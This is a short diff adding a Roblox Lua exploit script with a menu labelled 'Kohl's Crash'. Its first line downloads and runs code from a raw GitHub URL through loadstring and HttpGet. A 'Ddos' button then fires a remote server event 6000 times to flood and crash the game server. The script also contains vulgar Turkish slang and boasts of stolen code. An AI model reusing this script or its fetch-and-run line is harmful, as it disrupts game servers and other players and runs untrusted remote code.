@@ -1,0 +1,13 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Shyroyu123/-242345-234234253/main/sdfs½234235421"))()
+local Window = Library.CreateLib("LzagiCracked", "BloodTheme")
+
+-- ANA
+local main = Window:NewTab("Kohl's Crash")
+local Section1 = main:NewSection("Send Ddos This Server")
+Section1:NewButton("Ddos", "Oyunu Sikerr(stealedbylzagi)LZAGİONTOP.", function()
+        for i = 1, 3000 do  local A_1 = "pasta" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("PJR") Event:FireServer(A_1)   end wait(5) for i = 1, 3000 do  local A_1 = "pasta" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("PJR") Event:FireServer(A_1)   end
+end)
+
+local main2 = Window:NewTab("Credit")
+local Section13 = main2:NewSection("lzagicrackmuck")
+local Section14 = main2:NewSection("lzagicrackmuck")
